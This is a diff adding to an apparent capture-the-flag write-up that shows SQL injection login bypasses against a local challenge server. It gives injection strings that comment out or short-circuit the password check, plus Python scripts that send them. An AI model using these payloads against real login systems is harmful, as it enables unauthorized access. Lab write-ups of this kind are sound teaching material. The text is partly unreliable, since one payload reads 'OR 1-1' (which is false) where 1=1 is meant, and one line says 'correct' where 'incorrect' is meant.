@@ -261,7 +261,97 @@ def level4():
     return form(["username", "password"])
 ```
 
+We can see that out input data is being inserted within the SQL query.
+
+```
+SELECT rowid, * FROM users WHERE username = "{username}" AND password = "{password}"
+```
+
+If we provide the following input:
+
+```
+username: flag
+password: flag
+```
+
+The resultant SQL query will be:
+
+```
+SELECT rowid, * FROM users WHERE username = "flag" AND password = "flag"
+```
+
+Unless the credentials are valid this will not get us the flag.
+
 ### SQL Injection
+
+However, we can bypass the using a SQL injection.
+
 #### Login bypass by commnenting out password check
 
+If we provide the following input:
+
+```
+username: flag"--
+password: flag
+```
+
+The resultant SQL query will be:
+
+```
+SELECT rowid, * FROM users WHERE username = "flag"--" AND password = "flag"
+
+## Queried part:
+SELECT rowid, * FROM users WHERE username = "flag"
+
+## Commented part
+" AND password = "flag"
+```
+
+Since we are commenting out the WHERE clause that requires the password, we will be logged in even if the password is correct.
+
+```python
+import requests
+
+data={
+	"username": 'flag" --',
+	"password": 'flag'
+}
+
+response = requests.post("http://challenge.localhost/", data = data)
+print(response.text)
+```
+
 #### Login bypass by breacking password check
+
+If we provide the following input:
+
+```
+username: flag
+password: flag" OR 1-1--
+```
+
+The resultant SQL query will be:
+
+```
+SELECT rowid, * FROM users WHERE username = "flag" AND password = "flag" OR 1-1--"
+
+## Queried part:
+SELECT rowid, * FROM users WHERE username = "flag" AND password = "flag" OR 1-1
+
+## Commented part
+"
+```
+
+Since the result of 1=1 is always `true/1` and anything OR with 1 is 1, the query will always be executed even if the password  we provided isn't correct.
+
+```py
+import requests
+
+data={
+	"username": 'flag',
+	"password": '" OR 1=1 --'	
+}
+
+response = requests.post("http://challenge.localhost/", data = data)
+print(response.text)
+```
